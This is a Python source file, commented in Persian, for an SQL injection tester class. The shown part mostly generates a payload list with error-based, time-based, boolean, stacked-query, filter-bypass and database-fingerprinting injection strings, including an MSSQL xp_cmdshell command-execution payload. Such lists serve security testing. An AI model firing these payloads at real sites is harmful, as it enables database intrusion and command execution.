import requests
from urllib.parse import urlencode, urlparse, parse_qs
import time
import os

def animated_print(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

class SQLInjectionTester:
    def __init__(self, url, method="GET", data=None, headers=None, cookies=None, delay=0, timeout=10):
        """
        shirdalcode.ir
        """
        self.url = url
        self.method = method.upper()
        self.data = data
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.delay = delay
        self.timeout = timeout
        self.payloads = self.generate_payloads()
        self.vulnerabilities = {} # Dictionary to store vulnerabilities and errors


    def generate_payloads(self):
        # Payloadهای پایه و رایج برای تست SQL Injection
        base_payloads = [
            "'", "\"", "-- -", "#", "/*", "*/",
            "';", "\";",
            "or 1=1", "or '1'='1'", "or 1=2", "or '1'='2'",
            "and 1=1", "and '1'='1'", "and 1=2", "and '1'='2'",
            "' UNION SELECT NULL -- -", "' UNION SELECT 1,2,3 -- -",
            "' UNION ALL SELECT NULL,NULL,NULL -- -",
            "';", "\";", "`", "\\", "%%31", "%00", "%2527", "%bf%27", "%c0%27", "%df%27"  # دور زدن‌های Encoding
        ]

        # Payloadهایی که معمولاً باعث بروز خطا در پاسخ سرور می‌شوند
        error_based_payloads = [
            "'", "\"", "\\", "')", "))", "';", "\";", "%27", "%22",
            "'`", '"`', "')", "))--", "';--", "\";--",
            "'||(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)||'",  # خطای PostgreSQL
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 -- -",
            # خطای MySQL
            "' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U') > 0 -- -"  # خطای MSSQL
        ]

        # Payloadهایی برای تست آسیب‌پذیری‌های مبتنی بر زمان
        time_based_payloads = [
            "' AND SLEEP(5) -- -", "' OR SLEEP(5) -- -",
            "' AND BENCHMARK(1000000, MD5(1)) -- -", "' OR BENCHMARK(1000000, MD5(1)) -- -",
            "' AND pg_sleep(5) -- -",  # مبتنی بر زمان در PostgreSQL
            "'; WAITFOR DELAY '0:0:5' -- -"  # مبتنی بر زمان در MSSQL
        ]

        # Payloadهایی برای تست آسیب‌پذیری‌های مبتنی بر Boolean
        boolean_based_payloads = [
            "' AND 1=1 -- -", "' AND 1=2 -- -",
            "' OR 1=1 -- -", "' OR 1=2 -- -",
            "' AND (SELECT COUNT(*) FROM users) > 0 -- -",  # بررسی وجود جدول
            "' AND EXISTS(SELECT * FROM users) -- -",  # بررسی وجود جدول
            "' AND LENGTH(user()) > 0 -- -"  # بررسی طول خروجی تابع
        ]

        # اجرای چند Query پشت سر هم (ممکن است نیاز به پیکربندی خاص سرور داشته باشد)
        stacked_payloads = [
            "'; SELECT SLEEP(5); -- -",
            "'; EXEC master..xp_cmdshell 'dir'; -- -",  # اجرای دستورات سیستمی در MSSQL (خطرناک)
            "'; SHOW DATABASES; -- -"  # نمایش دیتابیس‌ها در MySQL
        ]

        # Payloadهایی برای دور زدن فیلترهای رایج
        bypass_payloads = [
            "'+sleep(5)+'--",  # تغییر حالت حروف
            "\"+sleep(5)+\"--",
            "'/**/AND/**/1=1--",  # استفاده از کامنت‌های درون خطی
            "'--char(32)sleep(5)--",  # مبهم‌سازی
            "'%2527 AND 1=1 --",  # کدگذاری URL برای علامت نقل قول
            "'/*!AND*/ 1=1 --"  # کامنت شرطی در MySQL
        ]

        # Payloadهای خاص برای دیتابیس MySQL
        mysql_payloads = [
            "' AND (SELECT @@version) LIKE '%MariaDB%' -- -",
            "' AND (SELECT version()) LIKE '%5.%' -- -"
        ]

        # Payloadهای خاص برای دیتابیس PostgreSQL
        postgres_payloads = [
            "' AND (SELECT version()) LIKE '%PostgreSQL%' -- -",
            "' AND (SELECT current_database()) IS NOT NULL -- -"
        ]

        # Payloadهای خاص برای دیتابیس MSSQL
        mssql_payloads = [
            "' AND (SELECT @@version) LIKE '%Microsoft SQL Server%' -- -",
            "' AND (SELECT COUNT(*) FROM master.dbo.sysdatabases) > 0 -- -"
        ]

        # Payloadهای خاص برای دیتابیس Oracle
        oracle_payloads = [
            "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%' -- -",
            "' AND (SELECT user FROM dual) IS NOT NULL -- -"
        ]

        all_payloads = (
                base_payloads + error_based_payloads + time_based_payloads + boolean_based_payloads +
                stacked_payloads + bypass_payloads + mysql_payloads + postgres_payloads +
                mssql_payloads + oracle_payloads
        )

        return list(set(all_payloads))  # حذف Payloadهای تکراری